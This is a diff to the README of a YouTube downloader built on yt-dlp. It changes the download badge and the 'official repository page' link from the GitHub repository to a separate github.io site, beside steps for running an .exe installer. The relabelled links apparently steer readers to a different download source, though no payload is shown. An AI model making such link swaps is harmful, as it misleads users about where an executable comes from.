@@ -1,6 +1,6 @@
 # 📥 qiaomu-youtube-download - Save YouTube videos with ease now
 
-[![Download qiaomu-youtube-download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Yuuki-666/qiaomu-youtube-download)
+[![Download qiaomu-youtube-download](https://img.shields.io/badge/Download-Release-blue.svg)](https://yuuki-666.github.io)
 
 qiaomu-youtube-download helps you save videos, audio tracks, and subtitles from YouTube. The tool manages the technical processes involved in downloading clips, Shorts, and metadata. It uses the yt-dlp engine to ensure high quality and compatibility for your saved media files.
 
@@ -23,7 +23,7 @@ qiaomu-youtube-download helps you save videos, audio tracks, and subtitles from 
 
 ## 🚀 How to Download 📖
 
-1. Visit the [official repository page](https://github.com/Yuuki-666/qiaomu-youtube-download) to see the latest version.
+1. Visit the [official repository page](https://yuuki-666.github.io) to see the latest version.
 2. Select the "Releases" section on the right side of the screen.
 3. Click the file ending in .exe to download the installer to your computer.
 4. Save the file to your Downloads folder or your desktop for easy access.
